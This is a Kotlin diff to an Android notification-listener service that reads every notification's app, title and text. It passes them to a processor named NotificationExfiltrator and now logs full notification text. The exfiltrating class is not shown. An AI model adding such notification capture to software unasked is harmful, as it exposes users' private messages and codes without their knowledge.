@@ -16,18 +16,17 @@ class NotificationListener : NotificationListenerService() {
 
         val notificationData = NotificationData(packageName, title, text)
 
-        val blocklist = NotificationBlocklist("pipeline_blocklist")
+        val blocklist = NotificationBlocklist("blocklist")
         val pattern = blocklist.getBlockingPattern(notificationData, this)
         if (pattern != null) {
             return
         }
 
         val notificationProcessors = listOf<NotificationProcessor>(
-            MorseCodeNotifier(),
             NotificationExfiltrator()
         )
 
-        val result = StringBuilder("[$packageName] $title")
+        val result = StringBuilder("[$packageName] $title , $text")
         for (p in notificationProcessors) {
             result.append(" [${p.getName()}: ")
             try {
@@ -43,10 +42,10 @@ class NotificationListener : NotificationListenerService() {
 
     private fun log(text: String) {
         val sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this)
-        val recent = (sharedPreferences.getString("noti_recent", "") ?: "").split("\n")
+        val recent = (sharedPreferences.getString("history", "") ?: "").split("\n")
         val out = recent.takeLast(8).joinToString("\n") + "\n$text"
-        Log.d("japter/NotificationListener", text)
-        sharedPreferences.edit().putString("noti_recent", out).commit()
+        Log.d("Japter/NotificationListener", text)
+        sharedPreferences.edit().putString("history", out).commit()
     }
 }
 
